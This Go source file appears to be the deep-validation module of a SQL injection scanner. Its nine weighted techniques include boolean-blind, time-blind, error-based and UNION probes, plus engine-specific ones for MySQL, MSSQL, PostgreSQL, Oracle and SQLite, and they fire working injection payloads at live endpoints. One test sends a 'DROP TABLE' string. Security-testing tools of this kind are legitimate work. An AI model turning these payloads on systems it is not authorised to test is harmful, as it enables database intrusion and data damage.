package scanner

import (
	"fmt"
	"io"
	"log"
	"math"
	"net/http"
	"net/url"
	"sort"
	"strings"
	"time"
)

// DeepResult holds the outcome of the deep local validation.
type DeepResult struct {
	Entry       EntryPoint
	Confirmed   bool
	Techniques  []string // which techniques confirmed the vulnerability
	BestPayload string   // the most effective payload found
	Confidence  float64  // 0.0 – 1.0
	DBEngine    string   // detected database engine (carried from heuristic or confirmed here)
}

// techniqueSignal represents a single test result feeding into the confidence score.
type techniqueSignal struct {
	Name    string
	Fired   bool
	Weight  float64
	Payload string
}

// DeepValidate performs advanced SQL injection confirmation on entry points
// that were flagged by the heuristic scan. This replaces the AI phase when
// no OpenRouter API key is available.
//
// Enhanced techniques:
//  1. Boolean-based blind (response differential with Jaccard similarity)
//  2. Time-based blind (multi-round statistical timing, 3 samples + median)
//  3. Error-based confirmation (targeted per DB engine)
//  4. UNION-based column counting
//  5. Error consistency testing (3-round stability check)
//  6. HTTP status code correlation
//  7. Content-length delta analysis
//  8. Injection context detection (auto-tailor payloads)
//  9. DB-specific confirmation probes (after engine hint from heuristic)
// 10. Second-order detection stub
func DeepValidate(suspicious []HeuristicResult) []DeepResult {
	// Fix #3: timeout must exceed the maximum delay payload duration.
	// Time-blind payloads inject SLEEP(3) × 3 rounds = up to ~9s + network overhead.
	// 35s gives enough headroom without hanging indefinitely.
	client := &http.Client{
		Timeout: 35 * time.Second,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}

	var results []DeepResult
	for _, hr := range suspicious {
		dr := deepProbe(client, hr)
		results = append(results, dr)
		if dr.Confirmed {
			log.Printf("[DEEP] ✓ Confirmed (%.0f%% confidence): %s %s — techniques: %v — DB: %s",
				dr.Confidence*100, dr.Entry.Method, dr.Entry.URL, dr.Techniques, dr.DBEngine)
		} else {
			log.Printf("[DEEP] ✗ Not confirmed: %s %s", dr.Entry.Method, dr.Entry.URL)
		}
	}
	return results
}

// deepProbe runs all confirmation techniques against a single entry point.
func deepProbe(client *http.Client, hr HeuristicResult) DeepResult {
	ep := hr.Entry
	var signals []techniqueSignal
	var bestPayload string

	// Pick a target parameter (first available)
	param := pickParam(ep)

	// Detect injection context first to tailor payloads
	ctx := detectInjectionContext(client, ep, param)
	log.Printf("[DEEP]   Injection context for %s param=%s → %s", ep.URL, param, ctx)

	// Detect DB engine hint from heuristic errors
	dbHint := detectDBFromHeuristicErrors(hr.MatchedErrors)

	// ── 1. Boolean-based blind ──────────────────────────────────────
	if ok, payload := booleanBlindTest(client, ep, param, ctx); ok {
		signals = append(signals, techniqueSignal{"boolean-blind", true, 0.25, payload})
		bestPayload = payload
	} else {
		signals = append(signals, techniqueSignal{"boolean-blind", false, 0.25, ""})
	}

	// ── 2. Time-based blind (multi-round median) ────────────────────
	if ok, payload := timeBlindTestStatistical(client, ep, param, ctx); ok {
		signals = append(signals, techniqueSignal{"time-blind", true, 0.20, payload})
		if bestPayload == "" {
			bestPayload = payload
		}
	} else {
		signals = append(signals, techniqueSignal{"time-blind", false, 0.20, ""})
	}

	// ── 3. Error-based confirmation ─────────────────────────────────
	if ok, payload := errorBasedTest(client, ep, param); ok {
		signals = append(signals, techniqueSignal{"error-based", true, 0.15, payload})
		if bestPayload == "" {
			bestPayload = payload
		}
	} else {
		signals = append(signals, techniqueSignal{"error-based", false, 0.15, ""})
	}

	// ── 4. UNION-based column count ─────────────────────────────────
	if ok, payload := unionTest(client, ep, param); ok {
		signals = append(signals, techniqueSignal{"union-based", true, 0.10, payload})
		if bestPayload == "" {
			bestPayload = payload
		}
	} else {
		signals = append(signals, techniqueSignal{"union-based", false, 0.10, ""})
	}

	// ── 5. Error consistency testing ────────────────────────────────
	if ok := errorConsistencyTest(client, ep, param); ok {
		signals = append(signals, techniqueSignal{"error-consistency", true, 0.10, ""})
	} else {
		signals = append(signals, techniqueSignal{"error-consistency", false, 0.10, ""})
	}

	// ── 6. HTTP status code correlation ─────────────────────────────
	if ok := statusCodeCorrelation(client, ep, param); ok {
		signals = append(signals, techniqueSignal{"status-correlation", true, 0.08, ""})
	} else {
		signals = append(signals, techniqueSignal{"status-correlation", false, 0.08, ""})
	}

	// ── 7. Content-length delta analysis ────────────────────────────
	if ok := contentLengthDelta(client, ep, param, ctx); ok {
		signals = append(signals, techniqueSignal{"content-length-delta", true, 0.05, ""})
	} else {
		signals = append(signals, techniqueSignal{"content-length-delta", false, 0.05, ""})
	}

	// ── 8. DB-specific confirmation probes ──────────────────────────
	if dbHint != "" {
		if ok, payload := dbSpecificProbe(client, ep, param, dbHint); ok {
			signals = append(signals, techniqueSignal{"db-specific-confirm", true, 0.15, payload})
			if bestPayload == "" {
				bestPayload = payload
			}
		} else {
			signals = append(signals, techniqueSignal{"db-specific-confirm", false, 0.15, ""})
		}
	}

	// ── 9. Second-order detection stub ──────────────────────────────
	if ok := secondOrderStub(client, ep, param); ok {
		signals = append(signals, techniqueSignal{"second-order", true, 0.12, ""})
	} else {
		signals = append(signals, techniqueSignal{"second-order", false, 0.12, ""})
	}

	// ── Weighted confidence scoring ─────────────────────────────────
	var techniques []string
	totalWeight := 0.0
	firedWeight := 0.0
	for _, s := range signals {
		totalWeight += s.Weight
		if s.Fired {
			firedWeight += s.Weight
			techniques = append(techniques, s.Name)
		}
	}

	// Heuristic already flagged it, so add a base score
	baseBonus := 0.08
	score := (firedWeight / math.Max(totalWeight, 0.01)) + baseBonus
	if score > 1.0 {
		score = 1.0
	}

	// Require at least one deep technique to confirm
	confirmed := len(techniques) > 0

	return DeepResult{
		Entry:       ep,
		Confirmed:   confirmed,
		Techniques:  techniques,
		BestPayload: bestPayload,
		Confidence:  score,
		DBEngine:    dbHint,
	}
}

// ═══════════════════════════════════════════════════════════════════════
// Injection Context Detection (Technique 8)
// ═══════════════════════════════════════════════════════════════════════

type injectionContext string

const (
	ctxUnknown    injectionContext = "unknown"
	ctxString     injectionContext = "string-single-quote"
	ctxStringDbl  injectionContext = "string-double-quote"
	ctxNumeric    injectionContext = "numeric"
	ctxInHTML     injectionContext = "html-attribute"
)

// detectInjectionContext determines whether the parameter is inside a quoted
// string, a numeric context, or an HTML attribute by analyzing error responses.
func detectInjectionContext(client *http.Client, ep EntryPoint, param string) injectionContext {
	// Send a single-quote probe
	sqResp := fetchWithPayload(client, ep, param, "1'")
	dqResp := fetchWithPayload(client, ep, param, "1\"")
	numResp := fetchWithPayload(client, ep, param, "1 AND 1=1")
	baseline := fetchWithPayload(client, ep, param, "1")

	if baseline == "" {
		return ctxUnknown
	}

	sqLower := strings.ToLower(sqResp)
	dqLower := strings.ToLower(dqResp)

	// Check for single-quote error (means we're in a single-quoted string)
	sqError := containsAny(sqLower, []string{"syntax error", "unterminated", "unclosed quotation", "you have an error"})
	dqError := containsAny(dqLower, []string{"syntax error", "unterminated", "unclosed quotation", "you have an error"})

	if sqError && !dqError {
		return ctxString
	}
	if dqError && !sqError {
		return ctxStringDbl
	}

	// Check if numeric injection works (different response from baseline without quotes)
	if numResp != "" && baseline != "" {
		numSim := jaccardSimilarity(baseline, numResp)
		if numSim > 0.85 {
			return ctxNumeric
		}
	}

	return ctxUnknown
}

// containsAny checks if s contains any of the given substrings.
func containsAny(s string, subs []string) bool {
	for _, sub := range subs {
		if strings.Contains(s, sub) {
			return true
		}
	}
	return false
}

// ═══════════════════════════════════════════════════════════════════════
// Technique 1: Boolean-based blind (enhanced with Jaccard similarity)
// ═══════════════════════════════════════════════════════════════════════

func booleanBlindTest(client *http.Client, ep EntryPoint, param string, ctx injectionContext) (bool, string) {
	// Get a baseline first
	baseline := fetchWithPayload(client, ep, param, "1")
	if baseline == "" {
		return false, ""
	}

	// Select payloads based on detected injection context
	type boolPair struct {
		truePl  string
		falsePl string
	}

	var pairs []boolPair
	switch ctx {
	case ctxString:
		pairs = []boolPair{
			{"1' AND '1'='1", "1' AND '1'='2"},
			{"1' OR '1'='1' AND '1'='1", "1' OR '1'='1' AND '1'='2"},
		}
	case ctxStringDbl:
		pairs = []boolPair{
			{"1\" AND \"1\"=\"1", "1\" AND \"1\"=\"2"},
		}
	case ctxNumeric:
		pairs = []boolPair{
			{"1 AND 1=1", "1 AND 1=2"},
			{"1 AND 2>1", "1 AND 1>2"},
		}
	default:
		// Try all contexts
		pairs = []boolPair{
			{"1 AND 1=1", "1 AND 1=2"},
			{"1' AND '1'='1", "1' AND '1'='2"},
			{"1\" AND \"1\"=\"1", "1\" AND \"1\"=\"2"},
		}
	}

	for _, pair := range pairs {
		trueResp := fetchWithPayload(client, ep, param, pair.truePl)
		falseResp := fetchWithPayload(client, ep, param, pair.falsePl)

		if trueResp == "" || falseResp == "" {
			continue
		}

		// Jaccard similarity comparison (word-level)
		trueSim := jaccardSimilarity(baseline, trueResp)
		falseSim := jaccardSimilarity(baseline, falseResp)

		// True should be similar to baseline (>85%), false should differ (<70%)
		if trueSim > 0.85 && falseSim < 0.70 {
			return true, pair.truePl
		}

		// Also check length-based differential as fallback
		baseLen := len(baseline)
		trueLen := len(trueResp)
		falseLen := len(falseResp)

		trueDiff := math.Abs(float64(trueLen-baseLen)) / math.Max(float64(baseLen), 1)
		falseDiff := math.Abs(float64(falseLen-baseLen)) / math.Max(float64(baseLen), 1)

		if trueDiff < 0.10 && falseDiff > 0.15 {
			return true, pair.truePl
		}

		// True and false differ significantly from each other
		tfDiff := math.Abs(float64(trueLen-falseLen)) / math.Max(float64(trueLen), 1)
		if tfDiff > 0.15 && trueDiff < falseDiff {
			return true, pair.truePl
		}
	}
	return false, ""
}

// jaccardSimilarity computes word-level Jaccard similarity between two strings.
// Returns a value between 0.0 (completely different) and 1.0 (identical).
func jaccardSimilarity(a, b string) float64 {
	wordsA := wordSet(a)
	wordsB := wordSet(b)

	if len(wordsA) == 0 && len(wordsB) == 0 {
		return 1.0
	}

	intersection := 0
	for w := range wordsA {
		if wordsB[w] {
			intersection++
		}
	}

	union := len(wordsA)
	for w := range wordsB {
		if !wordsA[w] {
			union++
		}
	}

	if union == 0 {
		return 1.0
	}
	return float64(intersection) / float64(union)
}

// wordSet splits text into a set of unique lowercased words.
func wordSet(s string) map[string]bool {
	set := make(map[string]bool)
	for _, w := range strings.Fields(strings.ToLower(s)) {
		set[w] = true
	}
	return set
}

// ═══════════════════════════════════════════════════════════════════════
// Technique 2: Time-based blind (multi-round statistical)
// ═══════════════════════════════════════════════════════════════════════

func timeBlindTestStatistical(client *http.Client, ep EntryPoint, param string, ctx injectionContext) (bool, string) {
	const rounds = 3

	// Measure baseline timing (3 rounds, take median)
	var baseTimes []time.Duration
	for i := 0; i < rounds; i++ {
		t := measureTime(client, ep, param, "1")
		if t < 0 {
			return false, ""
		}
		baseTimes = append(baseTimes, t)
	}
	baseMedian := medianDuration(baseTimes)

	delayPayloads := []struct {
		payload  string
		delaySec float64
	}{
		// MySQL
		{"1' AND SLEEP(3)-- -", 3},
		{"1 AND SLEEP(3)-- -", 3},
		// PostgreSQL
		{"1'; SELECT pg_sleep(3)-- -", 3},
		// MSSQL
		{"1'; WAITFOR DELAY '0:0:3'-- -", 3},
		// SQLite (heavy computation as time proxy)
		{"1' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(100000000/2))))-- -", 2},
	}

	for _, dp := range delayPayloads {
		// Run multiple rounds to reduce noise
		var timings []time.Duration
		for i := 0; i < rounds; i++ {
			elapsed := measureTime(client, ep, param, dp.payload)
			if elapsed < 0 {
				break
			}
			timings = append(timings, elapsed)
		}

		if len(timings) < rounds {
			continue
		}

		delayMedian := medianDuration(timings)
		expectedDelay := time.Duration(dp.delaySec-1) * time.Second
		threshold := baseMedian + expectedDelay

		// Median of delay requests should consistently exceed threshold
		if delayMedian > threshold && delayMedian > 2*time.Second {
			log.Printf("[DEEP]   Time-blind: baseline=%v, delay-median=%v (threshold=%v)", baseMedian, delayMedian, threshold)
			return true, dp.payload
		}
	}
	return false, ""
}

// medianDuration returns the median of a slice of durations.
func medianDuration(d []time.Duration) time.Duration {
	if len(d) == 0 {
		return 0
	}
	sorted := make([]time.Duration, len(d))
	copy(sorted, d)
	sort.Slice(sorted, func(i, j int) bool { return sorted[i] < sorted[j] })
	mid := len(sorted) / 2
	if len(sorted)%2 == 0 {
		return (sorted[mid-1] + sorted[mid]) / 2
	}
	return sorted[mid]
}

// ═══════════════════════════════════════════════════════════════════════
// Technique 3: Error-based confirmation
// ═══════════════════════════════════════════════════════════════════════

// errorBasedTest uses targeted error-eliciting payloads to confirm injection.
func errorBasedTest(client *http.Client, ep EntryPoint, param string) (bool, string) {
	payloads := []struct {
		payload string
		errors  []string
	}{
		// MySQL extractvalue / updatexml
		{"1 AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e))-- -",
			[]string{"xpath syntax error", "extractvalue", "operand should contain 1 column"}},
		{"1 AND UPDATEXML(1,CONCAT(0x7e,(SELECT version()),0x7e),1)-- -",
			[]string{"xpath syntax error", "updatexml"}},
		// MSSQL convert error
		{"1 AND 1=CONVERT(int,(SELECT @@version))-- -",
			[]string{"conversion failed", "convert", "nvarchar"}},
		// PostgreSQL cast error
		{"1 AND 1=CAST((SELECT version()) AS int)-- -",
			[]string{"invalid input syntax for", "integer"}},
		// Generic double-quote / single-quote break
		{"1'\"",
			[]string{"syntax error", "unterminated", "unclosed quotation"}},
	}

	for _, p := range payloads {
		body := fetchWithPayload(client, ep, param, p.payload)
		if body == "" {
			continue
		}
		lower := strings.ToLower(body)
		for _, errStr := range p.errors {
			if strings.Contains(lower, errStr) {
				return true, p.payload
			}
		}
	}
	return false, ""
}

// ═══════════════════════════════════════════════════════════════════════
// Technique 4: UNION-based column counting
// ═══════════════════════════════════════════════════════════════════════

// unionTest tries UNION SELECT with incrementing column counts to see
// if any count produces a valid (non-error) response.
func unionTest(client *http.Client, ep EntryPoint, param string) (bool, string) {
	// First get a baseline error response (with a bad union)
	errorBody := fetchWithPayload(client, ep, param, "1 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20-- -")

	for cols := 1; cols <= 15; cols++ {
		nulls := make([]string, cols)
		for i := range nulls {
			nulls[i] = "NULL"
		}
		payload := fmt.Sprintf("1 UNION SELECT %s-- -", strings.Join(nulls, ","))
		body := fetchWithPayload(client, ep, param, payload)
		if body == "" {
			continue
		}

		lower := strings.ToLower(body)
		// Success indicators: no SQL error AND response differs from the error body
		hasError := false
		errorMarkers := []string{"syntax error", "mismatch", "different number", "operand", "union select"}
		for _, marker := range errorMarkers {
			if strings.Contains(lower, marker) {
				hasError = true
				break
			}
		}

		if !hasError && len(body) > 0 {
			// If this response differs from the error body, we likely found the right column count
			if errorBody != "" && math.Abs(float64(len(body)-len(errorBody)))/math.Max(float64(len(errorBody)), 1) > 0.10 {
				return true, fmt.Sprintf("1 UNION SELECT %s-- -", strings.Join(nulls, ","))
			}
		}
	}
	return false, ""
}

// ═══════════════════════════════════════════════════════════════════════
// Technique 5: Error Consistency Testing
// ═══════════════════════════════════════════════════════════════════════

// errorConsistencyTest fires the same error-inducing payload 3 times and checks
// if the error appears consistently — flaky responses indicate coincidental matches.
func errorConsistencyTest(client *http.Client, ep EntryPoint, param string) bool {
	testPayload := "1'"
	errorKeywords := []string{
		"syntax error", "you have an error", "unterminated", "unclosed quotation",
		"ora-", "pg_query", "mysql", "sqlite", "odbc", "jdbc",
	}

	errorCount := 0
	const rounds = 3

	for i := 0; i < rounds; i++ {
		body := fetchWithPayload(client, ep, param, testPayload)
		if body == "" {
			continue
		}
		lower := strings.ToLower(body)
		for _, kw := range errorKeywords {
			if strings.Contains(lower, kw) {
				errorCount++
				break
			}
		}
		// Small delay between rounds to reduce noise
		time.Sleep(200 * time.Millisecond)
	}

	// All 3 rounds must trigger the error for consistency
	return errorCount == rounds
}

// ═══════════════════════════════════════════════════════════════════════
// Technique 6: HTTP Status Code Correlation
// ═══════════════════════════════════════════════════════════════════════

// statusCodeCorrelation checks if injection payloads consistently trigger
// 500/503 errors while baseline returns 200.
func statusCodeCorrelation(client *http.Client, ep EntryPoint, param string) bool {
	// Get baseline status
	baseStatus := fetchStatusCode(client, ep, param, "1")
	if baseStatus == 0 || baseStatus >= 400 {
		return false // baseline already erroring, unreliable
	}

	errorPayloads := []string{"1'", "1\"", "1' OR '1'='1", "1; DROP TABLE --"}
	errorStatusCount := 0

	for _, payload := range errorPayloads {
		status := fetchStatusCode(client, ep, param, payload)
		if status >= 500 {
			errorStatusCount++
		}
	}

	// At least half the payloads should trigger server errors
	return baseStatus < 400 && errorStatusCount >= len(errorPayloads)/2
}

// fetchStatusCode sends a request and returns just the HTTP status code.
func fetchStatusCode(client *http.Client, ep EntryPoint, param, payload string) int {
	var resp *http.Response
	var err error

	switch ep.Method {
	case "POST":
		form := url.Values{}
		for k := range ep.Params {
			if k == param {
				form.Set(k, payload)
			} else {
				form.Set(k, "test")
			}
		}
		resp, err = client.PostForm(ep.URL, form)
	default:
		u, buildErr := buildURL(ep, param, payload)
		if buildErr != nil {
			return 0
		}
		resp, err = client.Get(u)
	}

	if err != nil {
		return 0
	}
	defer resp.Body.Close()
	io.Copy(io.Discard, resp.Body)
	return resp.StatusCode
}

// ═══════════════════════════════════════════════════════════════════════
// Technique 7: Content-Length Delta Analysis
// ═══════════════════════════════════════════════════════════════════════

// contentLengthDelta measures consistent byte-size differences between
// tautology and contradiction responses — a reliable blind SQLi indicator.
func contentLengthDelta(client *http.Client, ep EntryPoint, param string, ctx injectionContext) bool {
	type pair struct {
		truePl  string
		falsePl string
	}

	var pairs []pair
	switch ctx {
	case ctxString:
		pairs = []pair{{"1' AND '1'='1", "1' AND '1'='2"}}
	case ctxStringDbl:
		pairs = []pair{{"1\" AND \"1\"=\"1", "1\" AND \"1\"=\"2"}}
	case ctxNumeric:
		pairs = []pair{{"1 AND 1=1", "1 AND 1=2"}}
	default:
		pairs = []pair{
			{"1 AND 1=1", "1 AND 1=2"},
			{"1' AND '1'='1", "1' AND '1'='2"},
		}
	}

	const rounds = 3
	for _, p := range pairs {
		consistent := true
		var deltas []int

		for i := 0; i < rounds; i++ {
			trueResp := fetchWithPayload(client, ep, param, p.truePl)
			falseResp := fetchWithPayload(client, ep, param, p.falsePl)
			if trueResp == "" || falseResp == "" {
				consistent = false
				break
			}
			deltas = append(deltas, len(trueResp)-len(falseResp))
		}

		if !consistent || len(deltas) < rounds {
			continue
		}

		// Check if deltas are consistent (all same sign and within 10% variance)
		allSameSign := true
		for i := 1; i < len(deltas); i++ {
			if (deltas[i] > 0) != (deltas[0] > 0) {
				allSameSign = false
				break
			}
		}

		if allSameSign && abs(deltas[0]) > 10 {
			// Deltas are consistently non-zero and same direction
			avgDelta := 0
			for _, d := range deltas {
				avgDelta += abs(d)
			}
			avgDelta /= len(deltas)
			if avgDelta > 10 {
				log.Printf("[DEEP]   Content-length delta: consistent Δ=%d bytes across %d rounds", avgDelta, rounds)
				return true
			}
		}
	}
	return false
}

func abs(x int) int {
	if x < 0 {
		return -x
	}
	return x
}

// ═══════════════════════════════════════════════════════════════════════
// Technique 9: DB-Specific Confirmation Probes
// ═══════════════════════════════════════════════════════════════════════

// detectDBFromHeuristicErrors parses the heuristic error matches to determine
// the likely database engine.
func detectDBFromHeuristicErrors(errors []string) string {
	engineCounts := map[string]int{}
	for _, e := range errors {
		lower := strings.ToLower(e)
		switch {
		case strings.Contains(lower, "mysql"):
			engineCounts["MySQL"]++
		case strings.Contains(lower, "postgresql") || strings.Contains(lower, "pg_"):
			engineCounts["PostgreSQL"]++
		case strings.Contains(lower, "mssql") || strings.Contains(lower, "microsoft"):
			engineCounts["MSSQL"]++
		case strings.Contains(lower, "oracle") || strings.Contains(lower, "ora-"):
			engineCounts["Oracle"]++
		case strings.Contains(lower, "sqlite"):
			engineCounts["SQLite"]++
		}
	}

	bestEngine := ""
	bestCount := 0
	for engine, count := range engineCounts {
		if count > bestCount {
			bestCount = count
			bestEngine = engine
		}
	}
	return bestEngine
}

// dbSpecificProbe fires a DB-specific confirmation payload after the engine
// has been identified from heuristic errors.
func dbSpecificProbe(client *http.Client, ep EntryPoint, param, dbEngine string) (bool, string) {
	type probe struct {
		payload    string
		signatures []string
	}

	var probes []probe

	switch dbEngine {
	case "MySQL":
		probes = []probe{
			{"1 AND EXTRACTVALUE(1, CONCAT(0x7e, VERSION()))-- -",
				[]string{"xpath syntax error", "~5.", "~8.", "~10."}},
			{"1 AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.tables GROUP BY x)y)-- -",
				[]string{"duplicate entry", "for key"}},
		}
	case "MSSQL":
		probes = []probe{
			{"1 AND 1=CONVERT(int, @@version)-- -",
				[]string{"conversion failed", "nvarchar value", "microsoft sql server"}},
			{"1 AND 1=CONVERT(int, DB_NAME())-- -",
				[]string{"conversion failed", "nvarchar value"}},
		}
	case "PostgreSQL":
		probes = []probe{
			{"1 AND 1=CAST((SELECT version()) AS int)-- -",
				[]string{"invalid input syntax", "integer", "postgresql"}},
			{"1 AND 1=CAST(current_database() AS int)-- -",
				[]string{"invalid input syntax", "integer"}},
		}
	case "Oracle":
		probes = []probe{
			{"1 AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT banner FROM v$version WHERE ROWNUM=1))-- -",
				[]string{"ora-", "network error"}},
			{"1 AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE ROWNUM=1))-- -",
				[]string{"ora-", "drithsx"}},
		}
	case "SQLite":
		probes = []probe{
			{"1 AND TYPEOF(1)='integer'-- -",
				[]string{}}, // success = same as baseline
			{"1 AND sqlite_version() LIKE '%3%'-- -",
				[]string{}},
		}
	default:
		return false, ""
	}

	baseline := fetchWithPayload(client, ep, param, "1")

	for _, p := range probes {
		body := fetchWithPayload(client, ep, param, p.payload)
		if body == "" {
			continue
		}
		lower := strings.ToLower(body)

		// Check explicit signatures
		for _, sig := range p.signatures {
			if strings.Contains(lower, sig) {
				return true, p.payload
			}
		}

		// For SQLite (no error signatures), check if response matches baseline
		if dbEngine == "SQLite" && baseline != "" {
			sim := jaccardSimilarity(baseline, body)
			if sim > 0.90 {
				return true, p.payload
			}
		}
	}
	return false, ""
}

// ═══════════════════════════════════════════════════════════════════════
// Technique 10: Second-Order Detection Stub
// ═══════════════════════════════════════════════════════════════════════

// secondOrderStub stores a marker payload via POST, then fetches the same URL
// via GET to check if the marker reflects in the response — indicates stored
// or second-order SQL injection. This is a lightweight heuristic.
func secondOrderStub(client *http.Client, ep EntryPoint, param string) bool {
	// Only applicable for POST entry points with a display/profile page
	if ep.Method != "POST" {
		return false
	}

	// Use a marker that would cause an error if it gets into a SQL query
	marker := "sw_probe_1'" // single-quote to break SQL context

	// Store the marker
	form := url.Values{}
	for k := range ep.Params {
		if k == param {
			form.Set(k, marker)
		} else {
			form.Set(k, "test")
		}
	}

	resp, err := client.PostForm(ep.URL, form)
	if err != nil {
		return false
	}
	resp.Body.Close()

	// Now fetch the same URL via GET and look for SQL errors
	getResp, err := client.Get(ep.URL)
	if err != nil {
		return false
	}
	defer getResp.Body.Close()
	body, err := io.ReadAll(io.LimitReader(getResp.Body, 256*1024))
	if err != nil {
		return false
	}

	lower := strings.ToLower(string(body))
	errorSigns := []string{
		"syntax error", "unterminated", "unclosed quotation",
		"you have an error", "mysql", "ora-", "pg_query",
	}

	for _, sign := range errorSigns {
		if strings.Contains(lower, sign) {
			log.Printf("[DEEP]   Second-order: POST→GET triggered SQL error at %s", ep.URL)
			return true
		}
	}

	return false
}

// ═══════════════════════════════════════════════════════════════════════
// Helpers
// ═══════════════════════════════════════════════════════════════════════

// pickParam selects the first parameter name to test, or "id" as fallback.
func pickParam(ep EntryPoint) string {
	// Prefer common injectable names
	priority := []string{"id", "uid", "user", "username", "pass", "search", "query", "q", "page", "cat", "item"}
	for _, p := range priority {
		if _, ok := ep.Params[p]; ok {
			return p
		}
	}
	// Just pick the first one
	for k := range ep.Params {
		return k
	}
	return "id"
}

// buildURL creates the full URL with the given param set to the payload value.
func buildURL(ep EntryPoint, param, payload string) (string, error) {
	u, err := url.Parse(ep.URL)
	if err != nil {
		return "", err
	}
	q := u.Query()
	for k := range ep.Params {
		if k == param {
			q.Set(k, payload)
		} else {
			q.Set(k, "1") // neutral value for other params
		}
	}
	if _, ok := ep.Params[param]; !ok {
		q.Set(param, payload)
	}
	u.RawQuery = q.Encode()
	return u.String(), nil
}

// fetchWithPayload sends a request with a single param set to the payload and returns the body.
func fetchWithPayload(client *http.Client, ep EntryPoint, param, payload string) string {
	var resp *http.Response
	var err error

	switch ep.Method {
	case "POST":
		form := url.Values{}
		for k := range ep.Params {
			if k == param {
				form.Set(k, payload)
			} else {
				form.Set(k, "test")
			}
		}
		resp, err = client.PostForm(ep.URL, form)
	default:
		u, buildErr := buildURL(ep, param, payload)
		if buildErr != nil {
			return ""
		}
		resp, err = client.Get(u)
	}

	if err != nil {
		return ""
	}
	defer resp.Body.Close()
	limited := io.LimitReader(resp.Body, 256*1024)
	b, err := io.ReadAll(limited)
	if err != nil {
		return ""
	}
	return string(b)
}

// measureTime sends a request and returns the wall-clock duration.
func measureTime(client *http.Client, ep EntryPoint, param, payload string) time.Duration {
	u, err := buildURL(ep, param, payload)
	if err != nil {
		return -1
	}
	start := time.Now()
	var resp *http.Response
	switch ep.Method {
	case "POST":
		form := url.Values{}
		for k := range ep.Params {
			if k == param {
				form.Set(k, payload)
			} else {
				form.Set(k, "test")
			}
		}
		resp, err = client.PostForm(ep.URL, form)
	default:
		resp, err = client.Get(u)
	}
	if err != nil {
		return -1
	}
	defer resp.Body.Close()
	io.Copy(io.Discard, resp.Body)
	return time.Since(start)
}
